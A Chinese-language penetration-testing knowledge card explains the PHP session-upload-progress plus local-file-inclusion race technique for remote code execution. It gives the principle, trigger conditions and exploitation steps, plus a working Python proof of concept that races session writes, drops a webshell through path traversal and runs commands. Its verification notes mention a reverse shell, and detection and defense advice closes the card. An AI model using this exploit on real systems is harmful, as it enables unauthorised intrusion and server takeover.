---
id: web-php-file-inclusion-session-upload-progress-lfi-shell
title: PHP_SESSION_UPLOAD_PROGRESS + LFI 条件竞争：把 payload 写进 session 文件并包含 getshell
type: scenario
domain: web
path: web/php/file-inclusion
technique: php-session-upload-progress-lfi-race-rce
tags:
- php
- lfi
- file-inclusion
- session-upload-progress
- race-condition
- webshell
- rce
- pentest
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-13
  verified_at: '2026-11-08T07:35:34+08:00'
  notes: 已对照原文与图核对：图45 nc -lvnp 5555 收到 192.168.1.116 反弹 shell 并出现 $ 提示符，证明 session 上传竞争+LFI 包含确实执行成功；卡片 PoC 与原文脚本一致(50KB BytesIO 循环 POST index.php + PHP_SESSION_UPLOAD_PROGRESS 写入 file_put_contents 持久 webshell + 并发包含 sess_<sessid>)，登录用 admin/transorbital1 亦与原一致。dedup_review 成立：与 web-php-file-inclusion-session-poisoning-sess-file(cos 0.9183) 的区别真实存在——候选依赖应用把可控参数写入 $_SESSION，本草稿靠 PHP session.upload_progress 自动落盘且必须抢 cleanup 前包含(条件竞争)，触发条件/PoC 不同，force add 可接受。未验证点：卡片与原文均未给出 target 上 session.save_path 的确认过程(取 Debian 默认 /var/lib/php/sessions)；靶场未复跑；frontmatter 无 sources/source_url。
url: /docs/web/php/file-inclusion/web-php-file-inclusion-session-upload-progress-lfi-shell/
draft: false
kb_aliases:
- session upload progress LFI getshell
- PHP_SESSION_UPLOAD_PROGRESS 写 session 文件
- 条件竞争包含 sess_ 文件
- LFI to RCE 会话投毒
---

## 一句话结论

PHP 默认开启 `session.upload_progress.enabled` 时，文件上传过程中 POST 的 `PHP_SESSION_UPLOAD_PROGRESS` 字段值会被写入 `sess_<PHPSESSID>` 会话文件；攻击者一边用固定 PHPSESSID 持续上传大文件（该字段携带 PHP 代码），一边用 LFI 反复包含 `/var/lib/php/sessions/sess_<PHPSESSID>`，即可在 `session.upload_progress.cleanup` 清除进度数据前把任意 PHP 代码写进 session 文件并包含执行，落地持久 webshell 或反弹 shell。

## 原理

- 上传进行中，PHP 会把 `PHP_SESSION_UPLOAD_PROGRESS` 的值（连同上传进度数组）序列化写入 session 文件，文件名由客户端 `PHPSESSID` cookie 决定；即使应用代码没有主动 `session_start()`，只要 `session.upload_progress.enabled=On` 且请求携带该字段与同名 PHPSESSID，PHP 也会自动创建/写入 session 文件。
- 字段名由攻击者控制 → 字段值可含 `<?php ... ?>`，于是 session 文件内容里出现可执行 PHP 代码。
- `session.upload_progress.cleanup=On` 时上传结束后进度数据会被清除，因此需**条件竞争**：用较大的上传体（如 50KB）拉长上传窗口，POST 线程循环上传保持 session 文件存在，READ 线程并发地用 LFI 反复包含该 session 文件，在清除前抢到执行。
- 本题脚本中，被包含执行的代码用 `file_put_contents('/var/lib/php/sessions/<shell>.php', base64_decode('<webshell>'))` 把持久 webshell 落到同目录；随后直接包含该 webshell 文件并 POST `cmd` 执行命令（webshell 内含反弹 shell）。
- 前置链条：存在可包含任意路径的 LFI（如 `manage.php?file=../../../../...`）、session 保存目录已知/可猜（`/var/lib/php/sessions/`，Debian 默认）、`session.upload_progress.enabled=On`、PHPSESSID 可控、需已登录（LFI 页面要求会话）。

## 触发条件

- 目标为 PHP，`session.upload_progress.enabled=On`（默认开启）且 `cleanup` 行为可竞争；
- 存在 LFI 能包含 session 目录下的文件，且 Web 进程有该目录读权限；
- 攻击者可设置 `PHPSESSID` 并在上传请求中携带 `PHP_SESSION_UPLOAD_PROGRESS`；
- 已知 session 保存路径（可通过 phpinfo/config 或默认路径猜测）；
- LFI 页面需会话时已有有效登录 Cookie。

## 利用步骤

1. 确认 LFI 点（如 `manage.php?file=`）与 session 目录（`/var/lib/php/sessions/`）。
2. 起 POST 线程：固定 `PHPSESSID=<sessid>`，持续向任意接受上传的 PHP 页面 POST，`data` 中放 `PHP_SESSION_UPLOAD_PROGRESS` = 含 PHP 代码的字符串，`files` 里放一个较大的文件（如 50KB）拉长上传时间。
3. 被写入的 payload 在 session 文件被包含时，把持久 webshell（base64 解码）写到 sessions 目录。
4. READ 线程并发：用登录会话反复请求 `manage.php?file=../../../../var/lib/php/sessions/sess_<sessid>`，检测到自己写入的标记即说明包含成功。
5. 访问 `manage.php?file=../../../../var/lib/php/sessions/<shell>.php` 并 POST `cmd` 执行命令 / 反弹 shell。

## PoC

```python
import io, requests, threading
ip = '<target>'; sessid = 'attacker'; php_file = 'x.php'
def POST(session):
    payload = "<?php file_put_contents('/var/lib/php/sessions/" + php_file + \
              "', base64_decode('<base64-webshell>')); ?>"
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        session.post(f'http://{ip}/index.php',
                     data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
                     files={"file": ('filename', f)},
                     cookies={'PHPSESSID': sessid})
def READ():
    s = requests.Session()
    s.post(f'http://{ip}/manage.php', data={"username":"admin","password":"<admin口令>"})
    while True:
        r = s.get(f'http://{ip}/manage.php?file=../../../../var/lib/php/sessions/sess_{sessid}')
        if 'filename' in r.text:   # 命中自己的标记，webshell 已落地
            print(s.post(f'http://{ip}/manage.php?file=../../../../var/lib/php/sessions/{php_file}',
                         data={'cmd':'system("whoami");'}).text)
            break
t = threading.Thread(target=POST, args=(requests.session(),)); t.daemon = True; t.start()
READ()
```

说明：结构复现的通用脚本，session 路径/字段/标记/凭据需按目标调整，webshell 内容用 base64 占位；不访问、不执行。

## 变体与关联

- 变体：payload 直接写反弹 shell、写 `/etc/passwd` 外文件、或用 `session.upload_progress.name`/`prefix` 其它可控字段；用 `PHP_SESSION_UPLOAD_PROGRESS` 之外也可借 `PHP_SESSION_UPLOAD_PROGRESS` 数组键注入。
- 变体：session 目录可用 `phpinfo()`、`session_save_path()`、LFI 读配置、`/proc/*` 等确认；cleanup=Off 时无需竞争。
- 关联：[[web-php-file-inclusion-manage-file-param-wfuzz-traversal]]（同一 LFI 点）；[[web-php-file-inclusion-session-poisoning-sess-file]]（session 文件投毒/LFI）；[[web-php-file-inclusion-user-ini-session-save-path-webshell]]（.user.ini + session 路径）。

## 检测与防御

- 检测：请求中出现 `PHP_SESSION_UPLOAD_PROGRESS` 字段且值含 `<?php`/`file_put_contents`/`base64_decode`；同一 PHPSESSID 伴随高频大文件上传与高频 LFI 包含 session 路径。
- 检测：sessions 目录出现含 PHP 标签的非预期 `sess_*` 文件、异常 `.php` webshell 文件；Web 进程执行 `system`/反弹连接。
- 防御：关闭 `session.upload_progress.enabled`（不需要进度条时）；给上传进度设置独立前缀并禁止其内容进入可包含文件；限制 session 目录不可被 Web 路径包含。
- 防御：修复 LFI（路径白名单/realpath 校验）；PHP 更新配置并对 `PHP_SESSION_UPLOAD_PROGRESS` 值做严格过滤；监控 session 目录文件完整性。
